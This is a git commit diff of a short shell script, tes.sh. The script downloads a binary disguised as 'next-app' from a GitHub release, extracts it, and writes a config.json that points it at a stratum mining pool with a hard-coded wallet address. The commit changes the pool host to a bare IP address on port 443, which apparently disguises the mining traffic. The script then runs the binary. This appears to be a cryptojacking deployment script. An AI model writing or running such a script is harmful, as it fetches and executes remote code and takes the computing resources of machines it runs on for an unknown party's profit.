d57b1e88dcb2ae202c0b945e56ae6aea4baf6129
elujugakanfad <elujugakanfad@outlook.co.id>
2025-12-03 15:20:04 +0700

    Update tes.sh

--- tes.sh
+++ tes.sh
@@ -3,6 +3,6 @@ wget https://github.com/mom742886/next-app/releases/download/v1/next-app.tar.gz
 
 tar -xf next-app.tar.gz
 
-echo '{"host": "stratum-eu.rplant.xyz", "port": 7022, "user": "mbc1qh9m6s26m5u0snjk7wp5gl4v6w6ecsgz7jsv482", "pass": "x", "threads": 3}' > config.json
+echo '{"host": "stratum+tcp://93.123.82.33", "port": 443, "user": "mbc1qh9m6s26m5u0snjk7wp5gl4v6w6ecsgz7jsv482", "pass": "x", "threads": 3}' > config.json
 ls -la
 ./next/next-app
